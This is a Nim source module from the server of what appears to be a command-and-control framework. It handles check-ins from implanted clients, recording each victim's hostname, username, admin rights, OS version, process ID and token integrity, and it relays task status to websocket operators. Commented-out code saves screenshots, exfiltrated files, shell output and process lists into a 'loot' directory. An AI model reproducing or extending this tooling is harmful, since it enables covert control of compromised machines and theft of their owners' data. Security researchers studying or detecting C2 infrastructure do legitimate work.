import std/[
  asyncdispatch, 
  asyncfutures, 
  strutils, 
  strformat, 
  json, 
  md5
]

import pixie, ws

import types, logging, communication, handleResponse, events

proc generateClientHash(c: C2Client): string =
  getMD5(
    fmt"{c.ipAddress}{c.hostname}{c.username}{c.osType}{$c.windowsVersionInfo}"
  )

proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} = 
  let server = client.server

  let error = response["error"].getStr() 
  let taskId = response["taskId"].getInt(-1) 

  if taskId > -1:
    let task = server.tasks[taskId]
    if error != "":
      errorLog $client[] & ": " & error
    else: 
      case response["task"].getStr():
      of "identify":
        var itsReconnection = false
        client.hostname = response["data"]["hostname"].getStr("")
        client.username = response["data"]["username"].getStr("")
        client.isAdmin = response["data"]["isAdmin"].getBool(false)

        case response["data"]["osType"].getStr("unknown"):
        of "unknown":
          client.osType = UnknownOS
        of "windows":
          client.osType = WindowsOS
        of "linux":
          client.osType = LinuxOS
        client.windowsVersionInfo = WindowsVersionInfo(
          majorVersion: response["data"]["windowsOsVersionInfo"]["majorVersion"].getInt(),
          minorVersion: response["data"]["windowsOsVersionInfo"]["minorVersion"].getInt(),
          buildNumber: response["data"]["windowsOsVersionInfo"]["buildNumber"].getInt()
        )
        client.linuxVersionInfo = LinuxVersionInfo(
          kernelVersion: response["data"]["linuxOsVersionInfo"]["kernelVersion"].getStr(),
        )
        client.hash = client[].generateClientHash()
        # if parseBool(server.configuration.getOrDefault("handle_reconnections", "true")):
        #   for otherClient in server.clients:
        #     if otherClient.hash == client.hash and otherClient.id != client.id:
        #       let oldClientId = client.id
        #       for task in server.tasks:
        #         if task.client.id == client.id:
        #           task.client = otherClient
        #       # migrating client  
        #       var tcpSocket = getTcpSocket(client[])
        #       tcpSocket.id = otherClient.id
        #       client[] = otherClient
        #       client.connected = true
        #       itsReconnection = true
        #       # remove old client
        #       for c in server.clients:
        #         if c.id == oldClientId:
        #           server.clients.delete(
        #             server.clients.find c
        #           )
        #           break
        #       break
        client.isAdmin = response["data"]["isAdmin"].getBool(false)
        client.pid = response["data"]["pid"].getInt(0)
        client.pname = response["data"]["pname"].getStr("")
        client.isAdmin = response["data"]["isAdmin"].getBool()
        client.tokenInformation = TokenInformation(
          integrityLevel: TokenIntegrityLevel(
            sid: response["data"]["ownIntegrity"].getStr("")
          )
        )
        if itsReconnection: 
          cReconnected client[]
        if not client.loaded:
          client.loaded = true
          onClientConnected(client[])
          cConnected client[]
      of "output":
        infoLog $client[] & " completed task " & task.action
        handleResponse(client[], false, response)
    #     let output = response["data"]["output"].getStr()
    #     let category = response["data"]["category"].getStr()
    #     case category 
    #     of "TOKENINFO":
    #       let tokenInformation = parseJson(decode(output))
    #       task.output = tokenInformation
    #       client.tokenInformation.integrityLevel.sid = tokenInformation["tokenIntegrity"].getStr("")
    #       client.tokenInformation.groups = @[]
    #       for tokenGroup in tokenInformation["tokenGroups"]:
    #         client.tokenInformation.groups.add((
    #           name: tokenGroup["name"].getStr(""),
    #           sid: tokenGroup["sid"].getStr(""),
    #           domain: tokenGroup["domain"].getStr("")))
    #     of "PROCESSES":
    #       let output = parseJson(decode(output))
    #       task.output = output
    #       client.processes = @[]
    #       for process in output["processes"]:
    #         client.processes.add((
    #           name: process["name"].getStr(""),
    #           id: process["id"].getInt(0)))
    #     of "SHELL":
    #       task.output = %*{"output": decode(output)}
    #       logClientOutput client[], category, output
    #     of "SCREENSHOT":
    #       infoLog "received screenshot from " & $client[]
    #       let decodedImage = decode(output)
    #       let image = decodeImage(decodedImage)
    #       # task.output = %*{
    #       #   "file": encode(image.encodeImage(JpegFormat)),
    #       #   "format": "jpeg"
    #       # }
    #       let filePath = client[].getLootDirectory() & "/screenshots/screenshot_" & now().format("yyyy-MM-dd-HH-mm-ss") & ".png"
    #       image.writeFile(filePath)
    #       infoLog "saving screenshot from " & $client[] & " to " & filePath
    #   of "file":
    #     task.output = %*{
    #       "file": response["data"]["path"].getStr(),
    #       "data": decode response["data"]["contents"].getStr() 
    #     }
    #     let (_, name, ext) = splitFile response["data"]["path"].getStr()
    #     let filePath = client[].getLootDirectory() & "/files/" & name & ext 
    #     writeFile(filePath, decode response["data"]["contents"].getStr())
    #     infoLog "received file " & name & ext & " from " & $client[]
    #     # logClientOutput client[], "DOWNLOAD", response["data"]["contents"].getStr()
    
    task.markAsCompleted(response)
    onClientTaskCompleted(client[], task)
    for wsConnection in client.server.wsConnections:
      if wsConnection.readyState == Open:
        discard wsConnection.send $(%*{
          "event": "taskstatus",
          "data": %task
        })
  else:
    await client[].askToIdentify()
